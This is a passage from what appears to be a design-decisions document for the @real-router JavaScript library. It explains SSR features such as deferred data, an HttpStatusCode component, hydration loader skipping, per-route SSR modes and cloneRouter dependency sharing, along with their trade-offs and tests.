- **Registry is monotonic.** `__rrDeferRegistry__` (global `Map`) grows unbounded over the page's lifetime — each settled key stays in the map. **Leak-by-design**: there is no `releaseKey()` API. The Map is bounded by the number of distinct deferred keys ever resolved in this page session (typically <50 for a content site, <500 for a heavy dashboard). Single-page apps that navigate thousands of times do not see growth from `defer()` — the Map grows only on new keys, and key names are typically a small finite set. Documented in `packages/ssr-data-plugin/CLAUDE.md` gotcha and asserted in stress test `defer-registry-growth.stress.ts` (1000 unique keys → Map.size === 1000, absent `releaseKey` API asserted).
- **`__rrDefer__` is a global.** Conflicts with any other library claiming the same name. Resolved by namespace prefix (`__rr`) and treated as a documented public API surface — renaming would be a breaking change.
- **No retry semantics.** If a deferred promise rejects, the consumer sees the error; there is no plugin-level retry. App-level retry happens at the loader, not the wire. Aligns with the "loader = pure resolution; transport = stream layer" separation.

### Audit confirmation

`ssr-data-plugin` audit (2026-05-16) verified the security invariants: shallow-clone freeze (PBT, `numRuns: 500`), reserved-keys rejection (PBT), HTML-safety of `formatSettleScript` and `getDeferBootstrapScript` (`numRuns: 500`, `escapeForScript` chain), `__rrDefer__("key", isError=true)` routing to `__rrDeferError__`. Stress: 500 concurrent streams with random upstream HTML errors, `seenUnhandled === []` assertion across 2000 streams × 1 key; 100 parallel `withTimeout` late-rejections with sibling-handler `seenUnhandled === []`. See `packages/ssr-data-plugin/.claude/review-2026-05-16.md` sections 6 (PBT) and 7 (stress) for the full coverage matrix.

## `<HttpStatusCode>` Stage 3 — render-time HTTP status as a component (#610 + #611)

### Problem

The existing loader-driven HTTP path covers cases where the server side knows the status before rendering: `throw new LoaderRedirect("/login", 302)` → 302, `throw new LoaderNotFound("user:42")` → 404, `throw new LoaderTimeout(name, ms)` → 504. But two real cases fall outside this:

1. **Component-level NotFound.** A glob `*` catchall route resolves successfully (route matched, loader returned an empty result) — yet the rendered component decides "this URL doesn't represent a real resource". Forcing the loader to throw retroactively requires duplicating route-knowledge in the loader; using `LoaderNotFound` from inside a loader for `*` defeats the catchall purpose (you'd need to throw from every `*`-handler, including default routes that intentionally render a NotFound page).
2. **Per-render status drift.** A blog post page resolves loader data successfully but the content was soft-deleted (`post.status === "removed"`). The component decides "render the removed-content placeholder + return HTTP 410 Gone". The status is a property of the **rendered output**, not the resolved data.

Pre-Stage 3: applications worked around this by re-throwing `LoaderNotFound` from within layout components (caught by `<RouterErrorBoundary>`) or by manually inspecting state after `renderToString` and rewriting the response. Both leaked rendering concerns into framework-specific places and broke under streaming (where status is needed in headers **before** body content emits).

### Solution

A render-scoped sink + a component that writes to it:

```typescript
// Server entry:
import { createHttpStatusSink, HttpStatusProvider } from "@real-router/react/ssr";

const sink = createHttpStatusSink();
const html = renderToString(
  <HttpStatusProvider sink={sink}>
    <App />
  </HttpStatusProvider>,
);

res.status(sink.code ?? 200).send(html);
```

```tsx
// Component:
import { HttpStatusCode } from "@real-router/react/ssr";

function NotFoundPage() {
  return (
    <>
      <HttpStatusCode code={404} />
      <h1>Not found</h1>
    </>
  );
}
```

`createHttpStatusSink()` returns `{ code: number | undefined }` — a mutable holder. `<HttpStatusCode code={N}/>` writes through the provider on mount. After `renderToString*` completes, `entry-server` reads `sink.code ?? 200` and applies to the response. For streaming SSR pipelines, the status is captured during the synchronous render phase (which produces the shell, including the `<head>`) — the streaming body cannot retroactively change status, and `<Suspense>` boundaries that resolve later cannot change it either (status is locked when the first byte is flushed).

On the client, the same `<HttpStatusCode code={N}/>` rendered without a provider is a silent no-op — same component tree hydrates without mismatch warnings.

### Cross-adapter symmetry × 6

Implementation is per-adapter idiomatic but contract-identical:

- **React/Preact** — `useContext(HttpStatusContext)?.code = props.code` in a `useInsertionEffect` (writes before paint, no double-write under StrictMode)
- **Vue** — `inject(HttpStatusKey)?.code = props.code` in `onMounted`
- **Solid** — `useContext(HttpStatusContext)?.code = props.code` in `onMount`
- **Svelte 5** — `getContext<HttpStatusSink>(HTTP_STATUS_KEY).code = code` in `$effect`
- **Angular** — environment-providers shape: `provideHttpStatusSink()` registers `HTTP_STATUS_SINK` injection token; `<http-status-code [code]="404">` component reads via `inject(HTTP_STATUS_SINK, { optional: true })?.set(code)` in `afterNextRender`

All six adapters expose the same three names: `<HttpStatusCode>`, `<HttpStatusProvider>` (or Angular's `provideHttpStatusSink` + `HTTP_STATUS_SINK`), `createHttpStatusSink()`.

### Why a mutable sink, not a thrown signal

- **Streaming-compatible.** `throw` interrupts rendering — incompatible with `<Suspense>` and any streaming pipeline that needs to deliver the shell while the deferred section is still rendering. The mutable sink captures status **synchronously during the shell render**, doesn't disrupt the React/Vue/Solid/Svelte render phase, and the status is read by the server **after** `renderToString*` returns.
- **Last write wins, by design.** If two `<HttpStatusCode>` instances render in the same tree (e.g., layout sets `200`, inner page sets `404`), the last assignment wins — matches the component-composition mental model where inner content overrides outer defaults.
- **No provider → silent no-op.** Client hydration runs the same component tree; on the client `<HttpStatusProvider>` is absent (status only matters server-side), so the write target is `undefined?.code = …` — TypeScript-safe via optional chaining, runtime no-op. **Zero hydration mismatches.**

### Vue/Solid client-mount asymmetry

Vue (fragment markers `<!--[-->`/`<!--]-->`) and Solid (`data-hk` per-component DOM markers) emit hydration anchors for **every** Suspense/component boundary, including `<HttpStatusProvider>`. If the server tree contains a provider but the client doesn't, hydration sees structural divergence and falls back to client re-render — defeats the SSR benefit.

The fix is mechanical: `entry-client.{ts,tsx}` mounts a throwaway `<HttpStatusProvider sink={createHttpStatusSink()}>` wrapper around `<App />` to preserve structural symmetry. The throwaway sink is never read (client doesn't apply HTTP status); the provider exists purely to match server-side markers.

Svelte 5 hydration is `{#if}`-branch-tolerant — the client provider mount is **not** needed. React/Preact tolerate the missing provider because `useContext` returns `undefined` and the component no-ops without DOM emission.

Documented in each `/ssr` adapter README; e2e-verified by the `Stage 3 / <HttpStatusCode>` scenario across all six `ssr/` examples (1 scenario per adapter, asserts `response.status === 404` for catchall route + `response.text()` contains the NotFound markup).

### Trade-offs

- **Status is captured during shell render, not during deferred resolution.** A `<Suspense>` fallback that renders `<HttpStatusCode code={500}/>` after a deferred section rejects — the status is **not** written to the response (headers already flushed). Apps that need per-section status emit it through loader-driven path (`LoaderRedirect`/`LoaderTimeout`) before the deferred wire starts.
- **Mutable sink is not React-strict-mode-safe by default.** React's StrictMode renders components twice; without `useInsertionEffect` (which runs once per commit, not once per render) two writes would race. The implementation uses `useInsertionEffect`; tested under StrictMode in `packages/react/tests/functional/HttpStatusCode.test.tsx`.
- **Angular requires explicit env-providers registration.** Angular DI does not support "optional global default sink that no-ops if not provided" without an `InjectionToken` + factory. Apps must call `provideHttpStatusSink()` at bootstrap; forgetting it → silent no-op on server (the intended fallback), but discoverable via `inject(HTTP_STATUS_SINK, { optional: true })` warning in dev mode.

## Post-hydration loader skip via hydration scratchpad (#596)

### Problem

In the classic SSR flow without coordination, the client re-fetches loader data immediately after hydration:

1. Server: `router.start("/users/42")` → loader runs → `state.context.data = { user: ... }` → HTML rendered with data.
2. Server: `serializeRouterState(state)` → JSON in `<script>window.__SSR_STATE__=...</script>`.
3. Client: `router.start("/users/42")` → loader runs **again** → same data fetched **again** → React/Vue/Solid/Svelte re-renders with the new data.

Step 3 wastes one full RTT per hydration. Worse, it creates a visible flicker if the loader takes >16ms (one frame): the hydrated UI shows server-rendered data, then briefly shows a stale state, then shows the re-fetched data. The competitive analysis showed this is the #1 SSR-correctness defect in standalone routers — `react-router` data mode solves it via `serverLoader` + `clientLoader` split (forces convention), TanStack via SWR cache (forces TTL config); standalone Vue/Solid/Svelte/Preact roughers leave it to the app.

### Solution

A one-shot **hydration scratchpad** at the core level. Before `router.start(state.path)` the client deserialises the server state and parks it in a per-router `RouterInternals.hydrationState` slot. The `ssr-data-plugin` `start()` interceptor reads the scratchpad and short-circuits — instead of calling the loader, it writes the server's `state.context.data` straight to the new state via `claim.write()`.

```typescript
// Client entry:
import { hydrateRouter } from "@real-router/core/utils";

const ssrJson = JSON.parse(document.getElementById("__SSR_STATE__")!.textContent!);
const router = createRouter(routes, { /* deps */ });
router.usePlugin(ssrDataPluginFactory(loaders), browserPluginFactory());

await hydrateRouter(router, ssrJson); // parks ssrJson in scratchpad, calls router.start(ssrJson.path)
// state.context.data === ssrJson.context.data — no loader call, no fetch
```

Mechanics:

1. `hydrateRouter(router, ssrState)` parses `ssrState` (or accepts pre-parsed), writes `parsed` to `RouterInternals.hydrationState`, calls `router.start(parsed.path)`.
2. `ssr-data-plugin`'s start interceptor checks `RouterInternals.hydrationState` synchronously inside `wrappedStart`. If the path matches and `"data" in scratchpad.context` (presence-wins, see below), it writes the scratchpad value via `claim.write()` instead of calling `entry.loader(...)`.
3. The plugin does **not** clear the scratchpad after reading — it is restored to its previous value (`null` outside a hydrate) in `hydrateRouter`'s `finally` block after `router.start()` resolves. All start-interceptor reads within one hydrate see the same scratchpad (side-by-side `ssr-data` + `rsc-server` both consume it); the next navigation sees `hydrationState === null` and runs the loader normally — **one-shot by design**, only the initial hydration benefits.

Per-namespace: each loader plugin (ssr-data-plugin, rsc-server-plugin) reads its own namespace from the scratchpad independently. Side-by-side composition still works — both `"data"` and `"rsc"` skip their loaders on the same hydration.

### Why `in` check, not `!== undefined`

The scratchpad check is `namespace in scratchpad.context`, not `scratchpad.context[namespace] !== undefined`. The distinction matters for **explicit `null`** loader returns: a server-side loader that returns `null` for "user not found, render empty profile" must hydrate with `data === null`, not re-run the loader. With `!== undefined`, an explicit `null` would slip past and trigger a re-fetch. The `in` check matches the JavaScript truth "the server published this namespace; the value (whatever it is) is the authoritative result".

The presence-wins contract is frozen by an anchor test in `packages/ssr-data-plugin/tests/functional/data-loader.test.ts:549-566` that asserts `data: undefined` in the scratchpad is treated as "missing" (loader runs) while `data: null` is treated as "present" (loader skipped). The contract is documented in `packages/ssr-data-plugin/CLAUDE.md` gotcha #5.

### Why a scratchpad, not a state-merging API

- **Synchronous read.** The start interceptor runs inside `wrappedStart`, before any `await`. A synchronous slot access on a `WeakMap<Router, ScratchpadShape>` is O(1) with zero allocation. A state-merging API ("start with this state as initial") would require deserialising into a `State` shape before `start()`, then merging — duplicating the FSM transitions for one edge case.
- **One-shot.** The scratchpad is cleared in `hydrateRouter`'s `finally` (restored to its prior value), not on read — so every start-interceptor read within one hydrate sees it, but no reference bleeds into later navigations.
- **Plugin-extensible.** `claimContextNamespace()` consumers naturally read their own namespace from the scratchpad. The mechanism scales to any number of loader plugins without core changes.

### Angular asymmetry — TransferState bridge

Angular's SSR pipeline (`@angular/ssr`) does not expose a way to inject a custom `<script>window.__SSR_STATE__=...</script>` block. Instead, Angular ships its own `TransferState` API + `<script id="ng-state" type="application/json">…</script>` convention. `provideRealRouterFactory` adapts to this:

1. **Server side:** after `await router.start(path)`, write `serializeRouterState(state)` into `TransferState` under the internal key `@real-router/angular:ssrState`. Angular SSR pipeline emits the `ng-state` script automatically.
2. **Client side:** `provideAppInitializer` callback reads the seed from `TransferState`, calls `hydrateRouter(router, ssrJson)` (instead of `router.start(path)`). Scratchpad is populated; ssr-data-plugin and rsc-server-plugin skip their loaders on first paint.

Symmetry with the other five adapters is preserved at the **contract level** (post-hydration loader skip works the same way) while using Angular's idiomatic transport. Documented in `packages/angular/CLAUDE.md` and verified by 4 e2e scenarios (one per pipeline: `ssr/`, `ssr-streaming/`, `ssg/`, `ssr-mixed/`).

### Trade-offs

- **Scratchpad is internal API.** `RouterInternals.hydrationState` is exposed only to the loader plugin via `getPluginApi(router)`. Apps cannot pre-populate the scratchpad to bypass loaders for non-hydration navigations — that would defeat the "scratchpad is hydration-specific" contract. Apps that need to inject pre-fetched data on regular navigation use `state.context.data` directly via a custom plugin.
- **Path mismatch falls through to loader.** If the hydration `ssrState.path` does not match the URL the router resolves (mid-navigation redirect on the server, URL rewrite), the scratchpad is **not consumed** and the loader runs normally on the client. The mismatched scratchpad is then discarded on the next clear. Documented as a non-issue: server-side `LoaderRedirect` causes the server to render the *destination* page, so `ssrState.path` already reflects the post-redirect URL.
- **No retry on failure.** If the scratchpad write fails (claim was released, namespace re-claimed by a different plugin), the path falls through to the loader — degraded but not broken. The mismatched-claim case is structurally impossible if `usePlugin` registration order is identical between server and client (documented invariant).

### Dogfooding

Verified end-to-end across all six adapters via `post-hydration loader skip` Playwright scenario in each `ssr/`, `ssr-streaming/`, `ssr-rsc/`, and `ssr-mixed/` example. The test asserts that after hydration:

- Zero `/__bench/loader-call` increments are observed (server-side counter exposed by the test fixture for each loader)
- Browser network panel shows zero loader-driven `fetch` requests on first paint
- DOM content matches the SSR HTML byte-for-byte (no flicker between hydrated and re-fetched states)

Angular `provideRealRouterFactory` extends this to all 4 of its pipelines including `ssr-mixed/` "full" mode (shell modes naturally skip Angular bootstrap, so the bridge is structurally inactive for them).

## Per-route SSR mode + function form: `(state) => SsrMode` (#581)

### Problem

Mixed-rendering applications need per-route control: marketing pages SSR'd for SEO, dashboards client-rendered to reduce server cost, document detail pages SSR'd when the format is HTML but client-rendered when the format is PDF (no point pre-rendering binary content). The competitive landscape offers three shapes:

1. **Static path-based** (Angular `ServerRoute { renderMode: "Server" | "Client" | "Prerender" }`) — decision is part of the route configuration. Cannot vary by query string or resolved data.
2. **Boolean app-wide** (`react-router` framework mode `ssr: true|false`) — single global toggle.
3. **None** (`@solidjs/router` standalone, `vue-router` stable, `preact-iso`, `svelte-spa-router`) — all routes go through one SSR pipeline; opt-out requires application-level workaround.

None of these support data-driven per-navigation decisions like "render `/docs/intro` as HTML for `?format=html`, ship empty shell for `?format=pdf`" without forking the route into two definitions.

### Solution

`ssr-data-plugin`'s per-route entry accepts a discriminated union:

```typescript
import { ssrDataPluginFactory } from "@real-router/ssr-data-plugin";

router.usePlugin(
  ssrDataPluginFactory({
    home: () => async () => ({ /* ... */ }),                       // short form → "full"
    "admin.dashboard": { ssr: false },                              // false → "client-only"
    "marketing.landing": { ssr: "data-only", loader: () => /* ... */ }, // JSON only, shell rendered client-side
    "docs.detail": {
      ssr: (state) => state.params.format === "pdf" ? "client-only" : "full",
      loader: () => async (params) => fetchDoc(params.id),
    },
  }),
);
```

The discriminated union: `SsrMode = "full" | "data-only" | "client-only"`, boolean aliases `true`/`false`, or function form `(state) => SsrMode` evaluated on every navigation.

Semantics:

- **`"full"`** — loader runs on server and client; SSR shell + JSON + post-hydration skip (#596).
- **`"data-only"`** — loader runs on server; SSR emits empty shell (`<div id="app"></div>` + `<script>__SSR_STATE__</script>`); client picks up data from scratchpad on hydration. **No server-side render of the component tree.**
- **`"client-only"`** — loader skipped on server **and client**; the route's `state.context.data` stays `undefined`; the application is expected to handle the client-side fetch (React Query, Suspense, `useEffect`).
- **Boolean `true`** ≡ `"full"`; boolean `false` ≡ `"client-only"`.
- **Function form** — invoked with the **already-resolved state** (after route matching, params/path/name available; before mode is written). Returns one of the three string modes. Re-evaluated per navigation.

Mode resolution writes to `state.context.ssrDataMode`; read via public helper `getSsrDataMode(state)`. The `entry-server` reads it after `await router.start(url)` and branches between `renderToString(<App/>)` and HTML shell:

```typescript
const state = await scope.router.start(req.url);
const mode = getSsrDataMode(state); // "full" | "data-only" | "client-only"
const html = mode === "full" ? renderToString(<App router={scope.router}/>) : SHELL;
res.send(htmlDoc(html, serializeRouterState(state)));
```

### Why function form receives resolved state

Function-form `(state) => SsrMode` receives the **already-routed** state (params, path, name populated) but **before** mode is written to `state.context.ssrDataMode`. This is deliberate:

- **Path/params/query are available** — apps can branch on `state.params.format === "pdf"`, `state.path.startsWith("/admin")`, or any combination of routed concerns.
- **Mode is not yet readable** — function resolver must compute mode from inputs, not read it. Prevents recursive resolution (`mode -> mode` feedback loop).
- **State is otherwise immutable from the resolver's perspective** — the function is pure data → mode; it cannot mutate state, register guards, or trigger navigation. Side-effects belong in lifecycle plugins, not in SSR mode resolution.

The execution order is: route match → state freeze (shallow on `context`) → `ssr-data-plugin` start interceptor calls function resolver → mode written to `state.context.ssrDataMode` → loader either runs or skips → activation guards.

### Why three modes, not two

`"full"` vs `"client-only"` is the obvious boolean split. `"data-only"` is the non-obvious third mode and was a recurring competitive ask:

- **App shell architecture.** Mobile-first apps that want fast TTFB (HTML shell + JSON in `<script>` tag = ~5 KB transferred before client bundle loads) ship `"data-only"` for everything except the landing page. The hydration entry mounts the app from JSON without server-side rendering of every component.
- **Avoiding double-render cost.** Client-heavy apps where SSR adds latency (component tree with thousands of nodes) but apps still want SSR-loaded data on first paint use `"data-only"` to skip the rendering cost while preserving the no-fetch-after-hydration benefit (#596).
- **Symmetric with TanStack Start.** TanStack Start ships `ssr: true | false | 'data-only'` (only in Start framework, not standalone). Mirroring the three-mode contract avoids competitive divergence for apps migrating to/from Start.

`rsc-server-plugin` ships a **subset** of these modes: `"full" | "client-only"`. RSC has no semantically meaningful "data without component" — a Server Component is rendered as a ReactNode, so "data-only RSC" would mean "render ReactNode but don't include it in the Flight stream", which has no use case. Rejected at factory time with a typed error: `mode "data-only" is not allowed for route "X". Allowed: full, client-only`.

### Trade-offs

- **Function resolver runs every navigation.** Including SSR boot and CSR navigation. Cost is O(1) per call; the function body should be a synchronous read of state fields. Async resolvers are not supported (function returns the mode synchronously; the plugin awaits the resolver only via `Promise.resolve(fn(state))` for type compatibility, not for async). Apps that need async decisions (e.g., feature-flag lookup) should pre-bake the flag into `state.context.<ns>` via a different plugin and read it synchronously.
- **Per-navigation mode is published, not memoised.** `state.context.ssrDataMode` is written on every navigation, even if the mode hasn't changed. Subscribers that care about mode transitions debounce themselves (`route.context.ssrDataMode !== previousRoute?.context.ssrDataMode`).
- **`"client-only"` mode is symmetric.** Loader is skipped on both server and client — application code must read `getSsrDataMode(state) === "client-only"` to know it must fetch data itself. Documented in each `ssr-mixed/` example README.
- **Mode marker takes priority over hydration scratchpad.** `"client-only"` skips loader unconditionally even if the scratchpad has data — preserves the "client-only means client handles fetching" contract. The scratchpad is wasted in this edge case (server published data, mode says ignore it); apps that mix `"client-only"` with pre-populated scratchpad data should re-think the architecture.

### Dogfooding

Six `ssr-mixed/` examples (React, Preact, Vue, Solid, Svelte, Angular) — each serves four routes × four configuration forms (short form, `{ ssr: false }`, `{ ssr: "data-only", loader }`, `{ ssr: (state) => …, loader }`). Per-adapter Playwright suite of 4 scenarios verifies:

1. **`"full"` mode** — server emits rendered HTML + JSON; client hydrates without re-fetch.
2. **`"data-only"` mode** — server emits empty shell + JSON; client mounts and reads `state.context.data` without fetch.
3. **`"client-only"` mode** — server emits empty shell, no JSON for this route; client fetches via app-level code.
4. **Function form** — same route with `?format=html` ↔ `?format=pdf` toggles the mode; assertion via `response.text()` body length and presence of `<script>__SSR_STATE__</script>`.

Angular `ssr-mixed/` is uniquely structured: `AngularNodeAppEngine` takes control of the request immediately after invocation, so per-route mode branching happens in **Express middleware before Angular** (`server.ts` performs `cloneRouter` + `ssrDataPluginFactory` + `await router.start(url)` BEFORE `angularApp.handle(req)`, reads `getSsrDataMode(state)`, branches: `next()` → AngularNodeAppEngine for `"full"` mode, or `res.send(shell)` for shell modes). The TransferState bridge applies automatically only in the `"full"` mode path; the shell modes use `<script>__SSR_STATE__</script>` directly (no Angular bootstrap, so no `TransferState` involvement). Documented in `packages/angular/CLAUDE.md` SSR section.

## Preact 11 forward-compat & peer-dep floor bump (#592)

### Problem

Preact 11 (currently in beta) restructures the `JSX` namespace: only `JSX.Element` and `JSX.IntrinsicElements` remain inside it; everything else (`HTMLAttributes`, `TargetedMouseEvent`, …) moves to the top-level `preact` namespace. Our `@real-router/preact` adapter referenced `JSX.HTMLAttributes` and `JSX.TargetedMouseEvent` in two source files (`src/types.ts`, `src/components/Link.tsx`), so the bundle would not type-check against v11. Peer dep `>=10.0.0` also had no way to opt into Preact 11 betas.

### Solution

- Source imports switched to the top-level form: `import type { HTMLAttributes, TargetedMouseEvent } from "preact"`. This compiles against Preact 10.28+ AND Preact 11 — Preact 10.28 introduced `src/dom.d.ts` and re-exported these types from the package root while keeping the legacy `JSXInternal` namespace as a backward-compat shim; Preact 11 retains the top-level exports and drops the namespace shim.
- `peerDependencies.preact` widened to `">=10.28.0 || ^11.0.0-0"`. The `-0` suffix lets `npm`/`pnpm` accept Preact 11 pre-release tags during the beta window. The floor moves from 10.0 → 10.28 because the new import path does not exist in earlier 10.x typings.
- `syncpack.config.mjs` adds an "Ignore preact peer dependency range" version group. The `sameRange` consistency policy panics on compound `||` ranges, and this peer dep is structurally a one-off.
- `packages/preact/devDependencies.preact` bumped from `10.25.4` → `10.29.2` so the adapter's own type-check exercises the new import path.

### Why this bumps the floor

We deliberately do **not** keep `JSX.HTMLAttributes` in the source even though it still works on Preact 10.28+. The whole point of the migration is to write code that compiles on Preact 11 without conditional types — keeping the namespace import would defer the change and leave a v11 footgun. The 10.0–10.27 user is a year+ behind on patches; the cost of asking them to bump is lower than carrying a back-compat shim through every adapter source.

### Stress-test regression — `combined-spa.stress.tsx` 8.2

Bumping the dev floor surfaced a latent stress-test issue: Preact 10.28 backported the v11 cascading-render fix (preactjs/preact#4966 + #4967), which now correctly coalesces same-microtask `setState` pairs whose final value equals the previous one. The transition stress test relied on **un**-batched rendering: it counted `useRouterTransition` renders across 100 fully-synchronous navigations, and because `IDLE_SNAPSHOT` is a frozen singleton, the polyfill's `Object.is(prev, next)` bail-out now collapses `IDLE → transitioning → IDLE` round trips to zero renders.

Fix: split each navigation into two `act` blocks using manually-resolved `addActivateGuard` promises so `TRANSITION_START` commits before `TRANSITION_SUCCESS` is fired. This mirrors how real apps interleave a microtask (guards, lazy loads, fetches) between start and end, which is what makes the transitioning state observable. The 100-render lower bound stays — the test is back to exercising both edges of the transition lifecycle, not whatever Preact's batcher chose to drop on that particular release.

### Forward direction

- `@testing-library/preact@3.2.4` (current pin) does not yet ship a Preact 11 compatible release. Matrix-testing the adapter against Preact 11 is blocked on the testing library — the issue carries the `upstream` label for this reason.
- Once `@testing-library/preact` ships an 11-compatible version, run the unit suite against both majors (manual matrix or pnpm-overrides per CI job) before publishing the 1.0 of the adapter.

## Replace Flag Propagation in `TransitionMeta` (#XXX)

### Problem

Three of the four "primary" `NavigationOptions` fields — `reload`, `redirected`, and (until now) `replace` — were treated asymmetrically by the transition pipeline. `reload` and `redirected` were lifted into `state.transition.{reload, redirected}` in `completeTransition.ts`, so subscribers could portably discriminate them across any URL plugin (browser, hash, navigation, memory, none). `replace` was not: a subscriber that wanted to know "was this transition a replace?" had to read `state.context.navigation.navigationType === "replace"`, which is set **only** by `@real-router/navigation-plugin`. Under `@real-router/browser-plugin`, `@real-router/hash-plugin`, or no URL plugin at all, the signal was simply unavailable.

The visible damage was in `shared/dom-utils/scroll-restore.ts`. Under navigation-plugin the utility correctly skipped scroll capture on a replace (OAuth callback, params canonicalization, `navigateToNotFound`, auto-force-from-`UNKNOWN_ROUTE`). Under browser-plugin the `state.context.navigation` namespace was undefined, the `!nav` early-return fired, and **every** transition — replace or not — snapped the viewport via `scrollToHashOrTop`. The same asymmetry blocked any subscriber-level "skip programmatic replaces" idiom from being written portably (analytics, view-transitions, route-announcer — none could rely on a plugin-specific namespace).

Internally `replace` is a **core-level decision**: it originates in `router.navigate(name, params, { replace })` and is auto-forced by `forceReplaceFromUnknown()` and `navigateToNotFound()` (Invariants 7 and 12 in `packages/core/INVARIANTS.md`). Subscribers were the one audience that could not see it.

### Solution

`TransitionMeta` gains an optional `replace?: boolean` field, written in three places (symmetric with `reload`):

- `completeTransition.ts` — `if (opts.replace !== undefined) meta.replace = opts.replace;` lifts user-supplied and auto-forced opts (including the result of `forceReplaceFromUnknown`).
- `NavigationNamespace.navigateToNotFound()` — inline meta gets `replace: true` directly, mirroring the `FROZEN_REPLACE_OPTS = { replace: true }` that plugins already see via `onTransitionSuccess`'s 3rd argument.
- `DEFAULT_TRANSITION` — unchanged (pre-navigation fallback, no opts to lift).

`shared/dom-utils/scroll-restore.ts` is refactored to consume the portable flag. Under any URL plugin the disambiguation now reads:

- `route.transition.replace || nav?.navigationType === "replace"` → skip restore.
- `route.transition.reload || nav?.navigationType === "reload"` → restore from `sessionStorage`.
- `nav?.direction === "back" || nav?.navigationType === "traverse"` → restore.
- otherwise → `scrollToHashOrTop`.

Both arms in the `replace` and `reload` checks are intentional. The plugin arm preserves F5/cross-document scroll restoration under navigation-plugin (`getActivationType()` #531 priming sets `nav.navigationType === "reload"` while leaving `opts.reload` undefined on the initial transition). Dropping the plugin arm would silently regress F5 under navigation-plugin.

### Why

**Symmetry with the existing precedent.** `reload` and `redirected` proved the pattern; `replace` was the last hold-out. The added field is additive, optional, and zero API-breaking on the core type level.

**Closes a real gap, not a theoretical one.** The verified consumer is `scroll-restore.ts`. Under browser-plugin every replace transition (e.g. an OAuth callback `router.navigate("dashboard", {}, { replace: true })`) used to snap the viewport. Now it preserves position. The same change unblocks `scroll-spy` (#575) under browser-plugin and lets analytics / loaders use a `if (route.transition.replace) return` idiom portably.

**Subscriber/plugin visibility parity.** Plugins received `opts.replace` via `onTransitionSuccess(toState, fromState, opts)` since forever. After this change subscribers see it via `state.transition.replace` — closes the asymmetry between the two audiences that Invariant 7 had documented but not exposed.

### Before / After — scroll-restore behaviour under `browser-plugin` (`scrollRestoration={{ mode: "restore" }}`)

| Transition type                                                                                | Before                                              | After                                                          |
| ---------------------------------------------------------------------------------------------- | --------------------------------------------------- | -------------------------------------------------------------- |
| Forward push (`<Link>` without `replace`)                                                      | `scrollToHashOrTop` (snap to top / anchor)          | `scrollToHashOrTop` (unchanged)                                |
| Replace (`navigate(..., { replace: true })`, OAuth callback, params canonicalization)          | `scrollToHashOrTop` (undesired snap)                | **skip** (preserve scroll position)                            |
| Programmatic reload (`navigate(..., { reload: true })`)                                        | `scrollToHashOrTop` (snap, lose pre-reload position) | **restore** from `sessionStorage` (via `subscribe`'s `previousRoute` capture; `pagehide` does not fire on same-document programmatic nav) |
| F5 cross-document (browser-driven reload)                                                      | `scrollToHashOrTop`                                 | `scrollToHashOrTop` (**unchanged** — `opts.reload` is undefined on the initial transition and browser-plugin has no Navigation API `getActivationType` analogue; closing this requires a core-level F5 priming, out of scope) |
| Browser back/forward (popstate)                                                                | `scrollToHashOrTop` (snap)                          | `scrollToHashOrTop` (unchanged — `direction`/`traverse` disambiguation requires navigation-plugin) |
| `navigateToNotFound()`                                                                         | `scrollToHashOrTop`                                 | **skip** (driven by inline `transition.replace = true`)        |

Opt-out for users who relied on the legacy snap-on-every-transition behaviour: `scrollRestoration={{ mode: "top" }}`.

Under `@real-router/navigation-plugin` there is **no behaviour change** — every existing branch (`replace` / `reload` / `traverse` / `direction === "back"`) remains active. The new `transition.replace` / `transition.reload` checks short-circuit the same paths slightly earlier with identical observable results.

### Tests

- `packages/core/tests/functional/navigation/navigate/navigation-options.test.ts` — the "transition meta flags" suite gains six new cases covering `replace: true`, `replace: false`, default `undefined`, `navigateToNotFound`, `forceReplaceFromUnknown` auto-force, and the override of an explicit `replace: false` from `UNKNOWN_ROUTE` (the `!opts.replace` condition matches both `undefined` and `false`), plus a timing-parity case mirroring the existing reload guard test.
- `packages/dom-utils/tests/functional/scroll-restore.test.ts` — a new describe block adds six cases under a browser-plugin-like environment (no `state.context.navigation`) plus a regression test that simulates navigation-plugin's #531 priming (`nav.navigationType === "reload"` with `transition.reload === undefined`) and verifies that the F5 restore path still fires.
- `packages/angular/src/dom-utils/scroll-restore.ts` is regenerated from `shared/dom-utils/scroll-restore.ts` by the existing `prebundle` script (`pnpm -F @real-router/angular bundle`) — ng-packagr cannot follow the symlinks the other adapters use, so the file is git-tracked and must be kept in sync.

## `cloneRouter` keeps dependency values shared by reference, on purpose (#664)

### Problem

`cloneRouter(base, deps?)` merges `base.dependencies` and the override via shallow spread:

```typescript
const mergedDeps = { ...sourceDeps, ...dependencies };
```

Top-level keys are new; values (`Map`, `Set`, class instances, functions, nested plain objects) are shared by reference between `base` and every clone. An audit (`packages/core/.claude/audit/clone-router-deep-2026-05-22.md` Bug #1) reported this as a CRITICAL SSR data-leak vector and proposed an `isolateDeps: true` flag wired to `structuredClone(sourceDeps)`.

### Solution

**Keep the shallow merge. Document the contract loudly.** Three doc surfaces:

1. JSDoc on `packages/core/src/api/cloneRouter.ts` with the singletons-vs-per-request rule and an `@example` showing the correct shape.
2. `real-router.wiki/clone.md` — dedicated **SSR multi-tenancy** section with a lifecycle table (singletons → base; per-request → override / `createRequestScope`).
3. `real-router.wiki/ssr.md` — SSR-safety callout next to the introductory `cloneRouter` example, linking back to (2).

No code changes in `cloneRouter.ts`. `createRequestScope` already routes per-request state through the override slot (`{ ...deps, abortSignal: signal }`) by construction.

### Why

**`structuredClone` of dependency values breaks the common case.** Verified locally:

- Class instances (`new DbClient()`) lose their prototype on clone — methods become `undefined`.
- Functions (`logger: () => "log"`) throw `DataCloneError`.
- Singleton pools (DB connection pool, LRU cache) fragment into N un-pooled copies, destroying pool semantics.
- Circular references throw.

`guardDependencies` in `packages/core/src/guards.ts:6` already constrains the top-level `dependencies` argument to a plain object, but values inside are intentionally unconstrained because most useful deps are class instances or services. Any auto-clone strategy is a regression for those shapes.

**The override slot already solves per-request isolation.** The documented SSR pattern is:

```typescript
const base = createRouter(routes, options, {
  db: new DbClient(dbUrl),       // singleton — shared (correct)
  logger,
});

// Per request
const clone = cloneRouter(base, {
  currentUser,                   // unique per request
  traceId,
});
// or, for Node/Web request lifecycles:
const scope = createRequestScope(req, base, { currentUser, traceId });
```

The override is fresh per call and applied last in the merge — it wins over base keys. `createRequestScope` additionally injects a fresh `AbortController().signal` as `abortSignal` per request, so the documented SSR pattern is already isolation-correct by construction.

**Cross-request leaks require misuse, not the documented pattern.** They only occur when per-request mutable state is placed in `base.dependencies` instead of the override — an architectural error no clone strategy can correct without breaking singleton sharing.

